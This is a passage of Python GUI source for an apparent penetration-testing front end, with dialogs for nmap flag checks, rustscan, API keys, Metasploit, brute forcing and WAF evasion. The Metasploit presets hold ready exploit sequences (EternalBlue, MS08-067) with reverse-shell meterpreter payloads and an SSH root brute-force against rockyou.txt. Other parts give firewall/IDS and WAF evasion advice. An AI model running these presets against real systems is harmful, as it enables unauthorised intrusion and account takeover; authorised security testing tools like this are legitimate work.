                "or -sT if you want actual service discovery."))

        # 2) Evasion combinations that misbehave ──────────────────────────
        if has("-f") and "--data-length" in low:
            issues.append((
                "warn",
                "-f combined with --data-length",
                "nmap fragments AND pads probes. Many stacks drop these\n"
                "silently, and --data-length is applied per-fragment, so\n"
                "probe size becomes unpredictable. Use one or the other."))

        if has("-f") and (has("-sC") or "--script" in low):
            issues.append((
                "warn",
                "-f with NSE scripts (-sC / --script)",
                "Fragmented probes confuse NSE: scripts that need a clean\n"
                "TCP stream (http-*, smb-*, ssl-*) will time out or\n"
                "return partial data. Consider dropping -f for a first\n"
                "enumeration pass, then re-running only evasion flags\n"
                "against the confirmed open ports."))

        if has("--badsum"):
            issues.append((
                "error",
                "--badsum will get zero replies from any normal host",
                "This flag is a firewall-detection trick (responses mean\n"
                "the packet reached a device that doesn't validate checksums,\n"
                "i.e. a FW pass-through). It is NOT suitable for port\n"
                "discovery — you'll get 'No open ports' on everything."))

        if has("--source-port") and has("-sT"):
            issues.append((
                "info",
                "--source-port is ignored when -sT is used",
                "-sT uses the kernel's connect() — the source port is\n"
                "chosen by the kernel and cannot be overridden. Use -sS\n"
                "(needs root) for source-port spoofing to take effect."))

        # Stacking multiple evasion flags multiplies silent-drop rate.
        evasion_hits = sum(1 for e in
            ("-f", "-D ", "-D RND", "--data-length",
             "--badsum", "--source-port")
            if e in low)
        if evasion_hits >= 3:
            issues.append((
                "warn",
                f"{evasion_hits} evasion techniques stacked",
                "Each evasion flag raises the odds a firewall/IDS drops\n"
                "the probe silently. With 3+ stacked you're quite likely\n"
                "to see 'no open ports' even on a wide-open host. Start\n"
                "with one, verify it still works, then add more."))

        # 3) Heavy combinations that hang or ban you ──────────────────────
        full_range = has("-p-") or "1-65535" in low
        vuln = "--script vuln" in low
        if full_range and vuln:
            issues.append((
                "warn",
                "-p- combined with --script vuln",
                "Running NSE vuln scripts on all 65535 ports can take\n"
                "hours on a normal host and routinely trips fail2ban /\n"
                "lab rate limits. Recommended flow:\n"
                "   1) nmap -Pn -T4 -p- <ip>        → list open ports\n"
                "   2) nmap -sV -sC --script vuln -p<open_ports> <ip>"))

        if full_range and has("-sU"):
            issues.append((
                "warn",
                "UDP scan on full 65535 range",
                "UDP is rate-limited by ICMP 'port unreachable' responses\n"
                "(Linux: 1/sec by default) — a full UDP sweep takes\n"
                "~18 hours. Use --top-ports 50 unless you specifically\n"
                "need an exotic UDP port."))

        if "-t5" in low.replace(" ", "") and vuln:
            issues.append((
                "warn",
                "-T5 with --script vuln",
                "T5 sets aggressive timeouts. NSE vuln scripts expect\n"
                "slower replies; many will abort with 'script timeout'\n"
                "before the target actually answers. Use -T4 or lower\n"
                "for script-heavy scans."))

        # 4) Redundant / silly combos ─────────────────────────────────────
        if has("-A") and (has("-sV") or has("-sC") or has("-O")):
            dups = [f for f in ("-sV", "-sC", "-O") if has(f)]
            issues.append((
                "info",
                f"-A already includes {', '.join(dups)}",
                "-A is shorthand for -sV -sC -O --traceroute. Selecting\n"
                "them again is harmless but adds nothing — the command\n"
                "line gets misleading."))

        if vuln and not has("-sV"):
            issues.append((
                "info",
                "--script vuln without -sV",
                "Many vuln scripts fire only after service/version\n"
                "detection confirms the target protocol. Without -sV you\n"
                "may miss vulnerabilities that would otherwise match."))

        if has("-O") and not any(t in tokens for t in
                                  ("-sS", "-sT")) and not has("-A"):
            issues.append((
                "info",
                "-O (OS detection) without a TCP scan type",
                "OS fingerprinting needs at least one open AND one closed\n"
                "TCP port. Pair with -sS or -sT for reliable results."))

        return issues

    def _show_conflict_dialog(self, flags: str, issues: list, on_continue):
        """Show a modal listing the detected flag problems with three
        choices: continue anyway, go back and edit, or cancel."""
        # Escalate dialog color to the worst severity present.
        sev_order = {"error": 0, "warn": 1, "info": 2}
        worst = min((sev_order.get(s[0], 3) for s in issues), default=3)
        title_color = (COLORS["text_red"]    if worst == 0 else
                       COLORS["text_yellow"] if worst == 1 else
                       COLORS["text_cyan"])

        win = _make_win(self._win, "Flag sanity check", 720, 600)
        ctk.CTkLabel(win, text="⚠  Flag combination review",
                     font=_f("xl", True),
                     text_color=title_color).pack(pady=(14, 4))
        ctk.CTkLabel(win,
                     text=f"$ nmap {flags} {{target}}",
                     font=_f("sm"),
                     text_color=COLORS["text_cyan"],
                     wraplength=660, justify="left"
                     ).pack(padx=24, pady=(0, 8))

        body = ctk.CTkScrollableFrame(
            win, fg_color=COLORS["bg_secondary"],
            scrollbar_button_color=COLORS["border_dim"],
            scrollbar_button_hover_color=COLORS["border_green"])
        body.pack(fill="both", expand=True, padx=16, pady=4)

        for sev, title, detail in issues:
            colr = (COLORS["text_red"]    if sev == "error" else
                    COLORS["text_yellow"] if sev == "warn"  else
                    COLORS["text_cyan"])
            icon = "✗" if sev == "error" else "⚠" if sev == "warn" else "ℹ"
            card = ctk.CTkFrame(
                body, fg_color=COLORS["bg_card"],
                border_color=colr, border_width=1, corner_radius=4)
            card.pack(fill="x", padx=4, pady=4)
            ctk.CTkLabel(
                card, text=f"  {icon}  {title}",
                font=_f("md", True), text_color=colr,
                anchor="w", justify="left"
            ).pack(fill="x", padx=8, pady=(6, 2))
            ctk.CTkLabel(
                card, text=detail,
                font=_f("sm"), text_color=COLORS["text_dim"],
                anchor="w", justify="left", wraplength=640
            ).pack(fill="x", padx=20, pady=(0, 8))

        has_error = any(s[0] == "error" for s in issues)
        foot = ctk.CTkLabel(
            win,
            text=("Errors found — running anyway is allowed but strongly\n"
                  "discouraged. Go back and fix them for meaningful results."
                  if has_error else
                  "You can run with these warnings or go back to edit."),
            font=_f("sm"),
            text_color=(COLORS["text_red"] if has_error
                        else COLORS["text_yellow"]),
            justify="center")
        foot.pack(padx=16, pady=(4, 4))

        def _continue():
            _safe_destroy(win)
            on_continue()

        def _go_back():
            # Just close the warning — user is back in the builder dialog.
            _safe_destroy(win)

        row = _btn_row(win)
        _btn(row, "GO BACK AND EDIT", _go_back, primary=True, w=180)
        _btn(row, "RUN ANYWAY", _continue,
             danger=has_error, warn=not has_error, w=140)

    def _confirm(self):
        direct = getattr(self, "_direct_cmd", ctk.StringVar()).get().strip()
        if direct:
            # Direct command bypasses the builder, so we only run a quick
            # sanity pass on what the user typed.
            issues = self._check_flag_conflicts(direct)

            def _fire_direct():
                _safe_destroy(self._win)
                if self._callback:
                    self._callback(self._tool, direct)

            if issues:
                self._show_conflict_dialog(direct, issues, _fire_direct)
            else:
                _fire_direct()
            return

        flags = self._build_flags()
        issues = self._check_flag_conflicts(flags)

        def _fire_built():
            _safe_destroy(self._win)
            if self._callback:
                self._callback(self._tool, flags)

        if issues:
            self._show_conflict_dialog(flags, issues, _fire_built)
        else:
            _fire_built()


class RustscanCustomDialog:
    """
    Option builder for rustscan. Differs from nmap:
     - Much faster: scans 65535 ports in ~3s with the right ulimit/batch.
     - Does NOT do service detection on its own: pipes to nmap via `--`.
     - Ideal for big port ranges or as a first pass before nmap -sV.
    """

    SCRIPT_MODES = {
        "Default — pipe to nmap -sV -sC (recommended)": "Default",
        "None — just ports, no nmap":                   "None",
        "Custom — you provide args after --":           "Custom",
    }

    SCOPES = {
        "All ports (1-65535) — fastest full sweep": "--range 1-65535",
        "Top 1000":                                 "--top",
        "Custom ports / range":                     "CUSTOM",
    }

    def __init__(self, parent, tool, callback=None):
        self._tool     = tool
        self._callback = callback
        self._scope_var       = ctk.StringVar(value="All ports (1-65535) — fastest full sweep")
        self._custom_ports    = ctk.StringVar(value="")
        self._batch_var       = ctk.StringVar(value="4500")
        self._timeout_var     = ctk.StringVar(value="1500")
        self._tries_var       = ctk.StringVar(value="1")
        self._ulimit_var      = ctk.StringVar(value="5000")
        self._script_var      = ctk.StringVar(value="Default — pipe to nmap -sV -sC (recommended)")
        self._nmap_extra_var  = ctk.StringVar(value="-sV -sC")
        self._accessible_var  = ctk.BooleanVar(value=False)
        self._greppable_var   = ctk.BooleanVar(value=False)
        self._preview_var     = ctk.StringVar(value="rustscan -a {target}")

        win = _make_win(parent, "rustscan — Custom Scan Builder", 720, 620)
        self._win = win

        # ── BOTTOM BAR — bulletproof layout (see NmapCustomDialog) ───────
        # Directly on `win`, FIXED height, side="bottom" packed FIRST.
        # Then header + scroll fill the remaining space on top.
        BOTTOM_H = 140
        bar = ctk.CTkFrame(win, fg_color=COLORS["bg_primary"],
                           height=BOTTOM_H)
        bar.pack(side="bottom", fill="x")
        bar.pack_propagate(False)
        bar.grid_columnconfigure(0, weight=1)

        ctk.CTkLabel(bar, textvariable=self._preview_var,
                     font=_f("sm"), text_color=COLORS["text_cyan"],
                     anchor="w"
                     ).grid(row=0, column=0, sticky="ew",
                            padx=24, pady=(6, 2))

        note_fr = ctk.CTkFrame(bar, fg_color=COLORS["bg_card"],
                               border_color=COLORS["text_yellow"],
                               border_width=1, corner_radius=4)
        note_fr.grid(row=1, column=0, sticky="ew", padx=24, pady=2)
        ctk.CTkLabel(
            note_fr,
            text="⚠  rustscan is loud — high packet rate. "
                 "Use -b 1000 -t 3000 for stealth.",
            font=_f("sm"), text_color=COLORS["text_yellow"],
            wraplength=640, justify="left", anchor="w"
        ).pack(fill="x", padx=10, pady=4)

        btn_row = ctk.CTkFrame(bar, fg_color="transparent")
        btn_row.grid(row=2, column=0, pady=(4, 6))
        _btn(btn_row, "BUILD & RUN", self._confirm, primary=True)
        _btn(btn_row, "CANCEL", lambda: _safe_destroy(win))

        # ── HEADER ──────────────────────────────────────────────────────
        ctk.CTkLabel(win, text="rustscan  —  Custom Scan Builder",
                     font=_f("xl", True),
                     text_color=COLORS["text_bright"]).pack(pady=(14, 4))
        ctk.CTkLabel(win,
                     text="Ultra-fast port scan. Options map 1:1 to rustscan CLI flags.",
                     font=_f("md"), text_color=COLORS["text_dim"],
                     wraplength=520, justify="center").pack(pady=(0, 4))

        # ── SCROLL fills everything between header and pinned bottom ────
        body = ctk.CTkScrollableFrame(
            win, fg_color=COLORS["bg_secondary"],
            scrollbar_button_color=COLORS["border_dim"],
            scrollbar_button_hover_color=COLORS["border_green"])
        body.pack(side="top", fill="both", expand=True, padx=16, pady=8)

        def _section(p, text):
            ctk.CTkLabel(p, text=text, font=_f("lg", True),
                         text_color=COLORS["text_green"]).pack(anchor="w", pady=(10, 4))

        def _entry(p, var, placeholder=""):
            e = ctk.CTkEntry(p, textvariable=var,
                             placeholder_text=placeholder,
                             font=_f("md"), height=32,
                             fg_color=COLORS["bg_card"],
                             text_color=COLORS["text_bright"],
                             border_color=COLORS["border_dim"], border_width=1,
                             placeholder_text_color=COLORS["text_muted"],
                             corner_radius=3)
            e.pack(fill="x", padx=4, pady=2)
            add_context_menu(e)
            return e

        # Port scope
        _section(body, "Port Scope")
        for label in self.SCOPES:
            ctk.CTkRadioButton(body, text=label, variable=self._scope_var, value=label,
                               font=_f("md"), text_color=COLORS["text_dim"],
                               fg_color=COLORS["border_green"],
                               border_color=COLORS["border_dim"]).pack(anchor="w", pady=2)
        _entry(body, self._custom_ports,
               "Custom: e.g. 22,80,443  or  1-1024  (used when 'Custom ports / range' is selected)")

        # Speed / tuning
        _section(body, "Speed & Reliability")
        speed_fr = ctk.CTkFrame(body, fg_color="transparent")
        speed_fr.pack(fill="x")
        for label, var, ph in [
            ("Batch size  (-b)",  self._batch_var,   "default 4500"),
            ("Timeout ms  (-t)",  self._timeout_var, "default 1500"),
            ("Tries       (-T)",  self._tries_var,   "default 1"),
            ("Ulimit      (--ulimit)", self._ulimit_var,
             "default 5000 — raise if 'Too many open files'"),
        ]:
            rf = ctk.CTkFrame(speed_fr, fg_color="transparent")
            rf.pack(fill="x", pady=2)
            ctk.CTkLabel(rf, text=label, font=_f("md"),
                         text_color=COLORS["text_dim"], width=160,
                         anchor="w").pack(side="left")
            _entry(rf, var, ph)

        # Output flags
        _section(body, "Output")
        ctk.CTkCheckBox(body, text="Greppable output (-g) — plain port list, nothing else",
                        variable=self._greppable_var,
                        font=_f("md"), text_color=COLORS["text_dim"],
                        fg_color=COLORS["border_green"], border_color=COLORS["border_dim"],
                        checkmark_color=COLORS["bg_primary"], width=20, height=20,
                        ).pack(anchor="w", pady=2)
        ctk.CTkCheckBox(body, text="Accessible mode (--accessible) — screen-reader friendly",
                        variable=self._accessible_var,
                        font=_f("md"), text_color=COLORS["text_dim"],
                        fg_color=COLORS["border_green"], border_color=COLORS["border_dim"],
                        checkmark_color=COLORS["bg_primary"], width=20, height=20,
                        ).pack(anchor="w", pady=2)

        # Script hand-off
        _section(body, "Hand-off to nmap (--scripts)")
        for label in self.SCRIPT_MODES:
            ctk.CTkRadioButton(body, text=label, variable=self._script_var, value=label,
                               font=_f("md"), text_color=COLORS["text_dim"],
                               fg_color=COLORS["border_green"],
                               border_color=COLORS["border_dim"]).pack(anchor="w", pady=2)
        ctk.CTkLabel(body, text="Extra args for nmap (after --):",
                     font=_f("sm"), text_color=COLORS["text_muted"],
                     anchor="w").pack(fill="x", padx=4, pady=(6, 2))
        _entry(body, self._nmap_extra_var, "e.g. -sV -sC -O --script vuln")

        # Trace for preview update
        for v in (self._scope_var, self._custom_ports, self._batch_var,
                  self._timeout_var, self._tries_var, self._ulimit_var,
                  self._script_var, self._nmap_extra_var):
            v.trace_add("write", lambda *_: self._update_preview())

        # Bottom bar already built above (preview + note + buttons).
        self._update_preview()

    def _build_flags(self) -> str:
        parts = []
        # Port scope
        scope_label = self._scope_var.get()
        scope_flag  = self.SCOPES.get(scope_label, "")
        if scope_flag == "CUSTOM":
            custom = self._custom_ports.get().strip()
            if custom:
                if "-" in custom and "," not in custom:
                    parts.append(f"--range {custom}")
                else:
                    parts.append(f"-p {custom}")
        elif scope_flag:
            parts.append(scope_flag)

        # Speed tuning — only emit if non-default / non-empty.
        # Exception: --ulimit is always emitted. RustScan warns loudly
        # when the process file limit is lower than its batch size, and
        # the GUI default is intended to prevent that on Kali VMs.
        for flag, var, default in [
            ("-b", self._batch_var,   "4500"),
            ("-t", self._timeout_var, "1500"),
            ("-T", self._tries_var,   "1"),
            ("--ulimit", self._ulimit_var,  "5000"),
        ]:
            v = var.get().strip()
            if v and (flag == "--ulimit" or v != default):
                parts.append(f"{flag} {v}")

        # Output flags
        if self._greppable_var.get():
            parts.append("-g")
        if self._accessible_var.get():
            parts.append("--accessible")

        # Script hand-off
        mode = self.SCRIPT_MODES.get(self._script_var.get(), "Default")
        if mode == "None":
            parts.append("--scripts None")
        elif mode == "Custom":
            parts.append("--scripts Custom")

        # Nmap extras after --
        nmap_extra = self._nmap_extra_var.get().strip()
        if nmap_extra and mode != "None":
            parts.append(f"-- {nmap_extra}")

        return " ".join(parts)

    def _update_preview(self):
        self._preview_var.set(f"$ rustscan -a {{target}} {self._build_flags()}".rstrip())

    def _confirm(self):
        flags = self._build_flags()
        _safe_destroy(self._win)
        if self._callback:
            self._callback(self._tool, flags)


class ApiKeyManagerDialog:
    """
    One-stop shop for every third-party API key used across HAWK.
    - Loads/saves to sessions/.apikeys.json via utils.apikeys
    - Optionally filters to providers relevant for a specific tool
    - On SAVE, regenerates the config files of every tool that cares.

    Parameters
    ----------
    parent : tk widget
    tool   : str | None
        If given, only show providers used by that tool, plus
        'Save & Run' / 'Run without keys' buttons. Otherwise show all.
    on_save : callable(tool=None) | None
        Invoked with the tool name after keys are persisted.
        Useful to kick off the tool after the user hits SAVE & RUN.
    on_skip : callable() | None
        Invoked when the user presses RUN WITHOUT KEYS (tool mode only).
    """

    def __init__(self, parent, tool: str = None,
                 on_save=None, on_skip=None):
        from utils.apikeys import PROVIDERS, load_keys, save_keys, write_all_configs
        self._PROVIDERS      = PROVIDERS
        self._load_keys      = load_keys
        self._save_keys      = save_keys
        self._write_configs  = write_all_configs

        self._tool    = tool
        self._on_save = on_save
        self._on_skip = on_skip
        self._entries = {}
        self._show_vars = {}

        current = load_keys()

        rows = [p for p in PROVIDERS if (tool is None or tool in p[2])]
        title = (f"API Keys — {tool}" if tool else "HAWK — API Key Manager")
        win = _make_win(parent, title, 640, min(660, 120 + len(rows) * 48))
        _title(win, title)
        _sub(win, "Paste keys from the provider dashboards. All keys stay local.")
        self._win = win

        # Bottom bar reserved first
        bar = ctk.CTkFrame(win, fg_color="transparent", height=120)
        bar.pack_propagate(False)
        bar.pack(side="bottom", fill="x")

        # Inline save-error line (hidden until a save actually fails).
        self._err_lbl = ctk.CTkLabel(
            bar, text="", font=_f("sm"),
            text_color=COLORS.get("text_red", COLORS["text_yellow"]),
            anchor="w", justify="left")
        self._err_lbl.pack(side="top", fill="x", padx=16, pady=(6, 0))

        scroll = ctk.CTkScrollableFrame(
            win, fg_color=COLORS["bg_secondary"],
            scrollbar_button_color=COLORS["border_dim"],
            scrollbar_button_hover_color=COLORS["border_green"])
        scroll.pack(side="top", fill="both", expand=True, padx=16, pady=8)

        for kid, display, tools, url in rows:
            row = ctk.CTkFrame(scroll, fg_color="transparent")
            row.pack(fill="x", pady=4, padx=4)

            ctk.CTkLabel(row, text=display, font=_f("md", True),
                         text_color=COLORS["text_bright"],
                         width=200, anchor="w").pack(side="left")

            show_var = ctk.BooleanVar(value=False)
            self._show_vars[kid] = show_var

            entry = ctk.CTkEntry(
                row, font=_f("md"), width=320, height=30,
                fg_color=COLORS["bg_card"], text_color=COLORS["text_bright"],
                border_color=COLORS["border_dim"], border_width=1,
                placeholder_text_color=COLORS["text_muted"],
                placeholder_text=f"paste {kid} here…",
                show="*")
            entry.pack(side="left", padx=4)
            if current.get(kid):
                entry.insert(0, current[kid])
            add_context_menu(entry)
            self._entries[kid] = entry

            # Show/hide toggle
            def _toggle(e=entry, v=show_var):
                v.set(not v.get())
                e.configure(show="" if v.get() else "*")
            ctk.CTkButton(
                row, text="👁", width=30, height=28,
                font=_f("sm"),
                fg_color=COLORS["bg_card"],
                hover_color=COLORS["bg_card_hover"],
                border_color=COLORS["border_dim"], border_width=1,
                text_color=COLORS["text_dim"], corner_radius=2,
                command=_toggle
            ).pack(side="left", padx=2)

            # Tools that use this key
            usage = ", ".join(tools[:3]) + (" …" if len(tools) > 3 else "")
            ctk.CTkLabel(row, text=f"[{usage}]",
                         font=_f("xs"), text_color=COLORS["text_muted"],
                         anchor="w").pack(side="left", padx=6)

            # Signup link hint
            if url:
                ctk.CTkLabel(row, text=f"↗ {url}",
                             font=_f("xs"),
                             text_color=COLORS["text_cyan"],
                             anchor="w").pack(fill="x", padx=(210, 0))

        # Buttons
        btn_row = _btn_row(bar)
        _btn(btn_row, "SAVE" + (" & RUN" if tool else ""),
             self._do_save, primary=True, w=160)
        if tool and on_skip is not None:
            _btn(btn_row, "RUN WITHOUT KEYS",
                 lambda: [_safe_destroy(win), on_skip()], w=180)
        _btn(btn_row, "CANCEL", lambda: _safe_destroy(win))

    def _do_save(self):
        keys = {kid: ent.get() for kid, ent in self._entries.items()}
        # Preserve existing keys that aren't shown in this filtered dialog
        existing = self._load_keys()
        existing.update(keys)
        if not self._save_keys(existing):
            # A failed save must NOT masquerade as success.  The old code
            # discarded this False, closed the dialog and ran the tool, so
            # a save that never hit disk was indistinguishable from one
            # that did: the operator's keys were silently gone and the
            # tool ran keyless.  Keep the dialog open, show why, run
            # nothing.
            try:
                self._err_lbl.configure(
                    text="  ✗  Could not save keys to sessions/.apikeys.json "
                         "— check permissions and disk space. Nothing was "
                         "run.")
            except Exception:
                pass
            return
        paths = self._write_configs()
        # NVD is a managed key now (utils.apikeys): push the saved value
        # into the in-memory CVE client so a change made here takes effect
        # immediately, without a restart.  `existing` still carries the
        # stored nvd value even in filtered (per-tool) mode where the
        # field isn't shown, so this is safe to call unconditionally.
        try:
            from utils import cve_lookup
            cve_lookup.get_client().set_api_key(existing.get("nvd", ""))
        except Exception:
            pass
        _safe_destroy(self._win)
        if self._on_save:
            try:
                self._on_save(tool=self._tool)
            except TypeError:
                self._on_save()


class MetasploitDialog:
    PRESETS = {
        "SMB EternalBlue (MS17-010)": [
            "use exploit/windows/smb/ms17_010_eternalblue",
            "set PAYLOAD windows/x64/meterpreter/reverse_tcp",
            "set LHOST {lhost}", "set LPORT {lport}",
            "set RHOSTS {target}", "exploit -j",
        ],
        "SSH Brute Force": [
            "use auxiliary/scanner/ssh/ssh_login",
            "set RHOSTS {target}",
            "set USERNAME root",
            "set PASS_FILE /usr/share/wordlists/rockyou.txt",
            "run",
        ],
        "SMB Version Scan": [
            "use auxiliary/scanner/smb/smb_version",
            "set RHOSTS {target}", "run",
        ],
        "MS08-067 NetAPI": [
            "use exploit/windows/smb/ms08_067_netapi",
            "set PAYLOAD windows/meterpreter/reverse_tcp",
            "set LHOST {lhost}", "set LPORT {lport}",
            "set RHOSTS {target}", "exploit -j",
        ],
        "Custom": [],
    }

    def __init__(self, parent, tool, callback=None):
        self._tool = tool; self._callback = callback
        self._preset_var = ctk.StringVar(value=list(self.PRESETS.keys())[0])
        win = _make_win(parent, "Metasploit — Automated", 620, 520)
        _title(win, "METASPLOIT  —  Automated Execution")
        _note_box(win,
                  "⚠  Authorized targets only.\n"
                  "   LHOST/LPORT set in next dialog.\n"
                  "   HAWK opens xterm with handler + exploit in one session.",
                  COLORS["text_yellow"])
        pr = ctk.CTkFrame(win, fg_color="transparent")
        pr.pack(fill="x", padx=24, pady=8)
        ctk.CTkLabel(pr, text="Preset:", font=_f("md"),
                     text_color=COLORS["text_dim"]).pack(side="left", padx=(0,10))
        ctk.CTkOptionMenu(
            pr, values=list(self.PRESETS.keys()),
            variable=self._preset_var,
            width=400, height=32, font=_f("md"),
            fg_color=COLORS["bg_card"], button_color=COLORS["border_dim"],
            dropdown_fg_color=COLORS["bg_secondary"],
            dropdown_text_color=COLORS["text_bright"],
            text_color=COLORS["text_dim"], corner_radius=3,
            command=self._load_preset,
        ).pack(side="left")
        ctk.CTkLabel(win, text="Commands (one per line):",
                     font=_f("sm"), text_color=COLORS["text_muted"],
                     anchor="w").pack(fill="x", padx=24, pady=(10,2))
        self._cmd_box = ctk.CTkTextbox(
            win, height=200,
            fg_color=COLORS["bg_card"], text_color=COLORS["text_bright"],
            border_color=COLORS["border_dim"], border_width=1,
            font=_f("md"), corner_radius=3)
        self._cmd_box.pack(fill="x", padx=24, pady=(0,8))
        self._load_preset(self._preset_var.get())
        row = _btn_row(win)
        _btn(row, "NEXT: SET LHOST/LPORT", self._confirm, primary=True, w=200)
        _btn(row, "CANCEL", lambda: _safe_destroy(win))
        self._win = win

    def _load_preset(self, name):
        cmds = self.PRESETS.get(name, [])
        self._cmd_box.delete("1.0", "end")
        self._cmd_box.insert("1.0", "\n".join(cmds))

    def _confirm(self):
        from utils.runner import find_free_port
        raw  = self._cmd_box.get("1.0", "end").strip()
        cmds = [l.strip() for l in raw.splitlines() if l.strip()]
        _safe_destroy(self._win)
        if cmds and self._callback:
            needs_lhost = any("{lhost}" in c or "LHOST" in c for c in cmds)
            if needs_lhost:
                LhostDialog(None,
                            callback=lambda lh, lp:
                            self._callback(self._tool, cmds, lh, lp))
            else:
                self._callback(self._tool, cmds, "", str(find_free_port(4444)))


class BruteForceDialog:
    def __init__(self, parent, tool, detected_os: str = "", callback=None):
        self._tool = tool; self._callback = callback
        self._os_var = ctk.StringVar(value=detected_os or "linux")
        self._bg_var = ctk.BooleanVar(value=True)
        protocol = ("ssh" if "ssh" in tool.id else "ftp" if "ftp" in tool.id
                    else "smb" if "smb" in tool.id else "http")
        from utils.runner import BruteForceEstimator, find_wordlist
        best_pass = find_wordlist(WORDLIST_PATHS_PASS) or WORDLIST_PATHS_PASS[0]
        est = BruteForceEstimator.estimate(best_pass, protocol, threads=4)
        win = _make_win(parent, "Brute Force Setup", 560, 480)
        _title(win, f"Brute Force  —  {tool.name}")
        fr = ctk.CTkFrame(win, fg_color=COLORS["bg_card"],
                          border_color=COLORS["border_amber"],
                          border_width=1, corner_radius=4)
        fr.pack(fill="x", padx=24, pady=(4,10))
        ctk.CTkLabel(fr,
                     text=f"  ⏱  Estimated: {est['human']}  ({est['total_attempts']:,} attempts × 4 threads)",
                     font=_f("md"), text_color=COLORS["text_yellow"],
                     anchor="w").pack(padx=10, pady=8, anchor="w")
        u_path = find_wordlist(WORDLIST_PATHS_USERS)
        p_path = find_wordlist(WORDLIST_PATHS_PASS)
        wl_col = COLORS["text_green"] if (u_path and p_path) else COLORS["text_red"]
        _note_box(win,
                  f"{'✓' if u_path else '✗'} Users:     {u_path or 'NOT FOUND'}\n"
                  f"{'✓' if p_path else '✗'} Passwords: {p_path or 'NOT FOUND'}",
                  wl_col)
        _sub(win, "Target OS:")
        for key, cfg in WORDLISTS.items():
            rf = ctk.CTkFrame(win, fg_color="transparent")
            rf.pack(anchor="w", padx=50, pady=3)
            ctk.CTkRadioButton(rf, text=cfg["label"],
                               variable=self._os_var, value=key,
                               font=_f("md"), text_color=COLORS["text_dim"],
                               fg_color=COLORS["border_green"],
                               border_color=COLORS["border_dim"]).pack(side="left")
        if detected_os:
            _note_box(win, f"★ nmap detected: {detected_os.upper()} — pre-selected",
                      COLORS["text_green"])
        _divider(win)
        ctk.CTkCheckBox(win,
                        text="Run in background (continue while running)",
                        variable=self._bg_var, font=_f("md"), text_color=COLORS["text_dim"],
                        fg_color=COLORS["border_green"], border_color=COLORS["border_dim"],
                        checkmark_color=COLORS["bg_primary"]).pack(pady=4)
        row = _btn_row(win)
        _btn(row, "START", self._confirm, primary=True)
        _btn(row, "CANCEL", lambda: _safe_destroy(win))
        self._win = win

    def _confirm(self):
        from utils.runner import find_wordlist
        u = find_wordlist(WORDLIST_PATHS_USERS) or WORDLIST_PATHS_USERS[0]
        p = find_wordlist(WORDLIST_PATHS_PASS)  or WORDLIST_PATHS_PASS[0]
        wl = {"users":u,"passwords":p,"label":WORDLISTS.get(self._os_var.get(),{}).get("label","")}
        _safe_destroy(self._win)
        if self._callback: self._callback(self._tool, wl, self._bg_var.get())


class WAFEvasionDialog:
    def __init__(self, parent, target: str, app, callback=None):
        self._target=target; self._app=app; self._callback=callback; self._checks={}
        win = _make_win(parent, "WAF Detected", 680, 620)
        _title(win, "⚠  Web Application Firewall Detected")
        _note_box(win, "Select evasion techniques and fill in custom values "
                       "where needed:", COLORS["text_yellow"])
        scroll = ctk.CTkScrollableFrame(win, fg_color=COLORS["bg_secondary"],
                                        scrollbar_button_color=COLORS["border_dim"])
        scroll.pack(fill="both", expand=True, padx=16, pady=8)
        for technique, explanation in WAF_EVASION_OPTIONS.items():
            var = ctk.BooleanVar(value=False)
            self._checks[technique] = var
            fr = ctk.CTkFrame(scroll, fg_color=COLORS["bg_card"],
                              border_color=COLORS["border_dim"], border_width=1, corner_radius=3)
            fr.pack(fill="x", padx=8, pady=3)
            ctk.CTkCheckBox(fr, text=technique, variable=var,
                            font=_f("md",True), text_color=COLORS["text_bright"],
                            fg_color=COLORS["border_green"], border_color=COLORS["border_dim"],
                            checkmark_color=COLORS["bg_primary"], width=20, height=20,
                            ).pack(anchor="w", padx=10, pady=(6,2))
            ctk.CTkLabel(fr, text=f"  → {explanation}", font=_f("sm"),
                         text_color=COLORS["text_dim"], wraplength=580,
                         justify="left", anchor="w").pack(anchor="w", padx=30, pady=(0,6))

        # ── Custom values box ─────────────────────────────────────────────
        custom_fr = ctk.CTkFrame(scroll, fg_color=COLORS["bg_card"],
                                 border_color=COLORS["border_green"],
                                 border_width=1, corner_radius=3)
        custom_fr.pack(fill="x", padx=8, pady=(10,6))
        ctk.CTkLabel(custom_fr, text="✎  Custom values (used when the "
                                      "matching technique above is selected):",
                     font=_f("md", True), text_color=COLORS["text_green"],
                     anchor="w").pack(fill="x", padx=10, pady=(8,4))

        def _row(parent_fr, label, placeholder):
            rf = ctk.CTkFrame(parent_fr, fg_color="transparent")
            rf.pack(fill="x", padx=10, pady=3)
            ctk.CTkLabel(rf, text=label, font=_f("sm"),
                         text_color=COLORS["text_dim"],
                         width=150, anchor="w").pack(side="left")
            var = ctk.StringVar(value="")
            e = ctk.CTkEntry(rf, textvariable=var,
                             placeholder_text=placeholder,
                             font=_f("md"), height=28,
                             fg_color=COLORS["bg_secondary"],
                             text_color=COLORS["text_bright"],
                             border_color=COLORS["border_dim"], border_width=1,
                             placeholder_text_color=COLORS["text_muted"],
                             corner_radius=3)
            e.pack(side="left", fill="x", expand=True, padx=6)
            return var

        self._ua_var    = _row(custom_fr, "User-Agent:",
                               "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ...")
        self._xff_var   = _row(custom_fr, "X-Forwarded-For:",
                               "127.0.0.1")
        self._hdr_var   = _row(custom_fr, "Extra header:",
                               "X-Custom: value")
        self._method_var = _row(custom_fr, "HTTP method:",
                                "HEAD, OPTIONS, PUT, ...")
        self._nikto_var = _row(custom_fr, "Nikto -evasion:",
                               "1-9 (1=random URI, 4=tab, 7=repeat ..)")
        ctk.CTkLabel(custom_fr,
                     text="  Leave blank to use safe defaults when the "
                          "technique is enabled.",
                     font=_f("sm"), text_color=COLORS["text_muted"],
                     anchor="w").pack(fill="x", padx=10, pady=(2,8))

        row = _btn_row(win)
        _btn(row, "APPLY & RUN", self._confirm, primary=True)
        _btn(row, "SKIP", lambda: _safe_destroy(win))
        self._win = win

    def _confirm(self):
        selected = [t for t,v in self._checks.items() if v.get()]
        custom = {
            "user_agent":       self._ua_var.get().strip(),
            "x_forwarded_for":  self._xff_var.get().strip(),
            "extra_header":     self._hdr_var.get().strip(),
            "http_method":      self._method_var.get().strip(),
            "nikto_evasion":    self._nikto_var.get().strip(),
        }
        _safe_destroy(self._win)
        if self._callback:
            # Back-compat: call with (selected) first, fall back to
            # (selected, custom) if the callback accepts two args.
            try:
                self._callback(selected, custom)
            except TypeError:
                self._callback(selected)


class WordlistCheckDialog:
    def __init__(self, parent, missing_path: str, callback_retry=None):
        from utils.runner import find_wordlist
        win = _make_win(parent, "Missing Wordlist", 560, 300)
